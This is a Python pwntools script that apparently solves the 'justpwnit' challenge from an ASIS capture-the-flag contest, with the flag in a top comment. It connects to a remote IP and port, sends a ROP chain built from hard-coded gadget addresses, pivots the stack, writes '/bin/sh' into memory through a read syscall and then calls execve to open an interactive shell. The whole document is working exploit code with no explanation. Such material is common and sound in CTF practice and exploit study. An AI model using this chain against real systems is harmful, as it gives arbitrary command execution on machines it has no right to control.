# ASIS{p01nt_RSP_2_h34p!_RHP_1n5t34d_0f_RSP?}
from pwn import *

#target = process("./justpwnit")
target = remote("168.119.108.148", 11010)

pop_rax = p64(0x0000000000401001)
pop_rdi = p64(0x0000000000401b0d)
pop_rsi = p64(0x00000000004019a3)
pop_rdx = p64(0x0000000000403d23)
sys_ret = p64(0x0000000000403888)
pop_rsp = p64(0x00000000004015e4)
_bin_sh = 0x000000000040b090
pop4 = p64(0x0000000000407e27)

def sla(d):
    target.sendlineafter(":", str(d))

def se(idx=0, data="whoamiT"):
    sla(idx)
    sla(data)

def sys_gen(rax, rdi, rsi, rdx):
    return pop_rax + p64(rax) + pop_rdi + p64(rdi) + pop_rsi + p64(rsi) + pop_rdx + p64(rdx) + sys_ret

rop = "a"*8 + sys_gen(0, 0, _bin_sh, 0x100) + pop_rsp + p64(_bin_sh + 8)
se(-2, rop)

target.sendline("/bin/sh\x00" + sys_gen(59, _bin_sh, 0, 0))

target.interactive()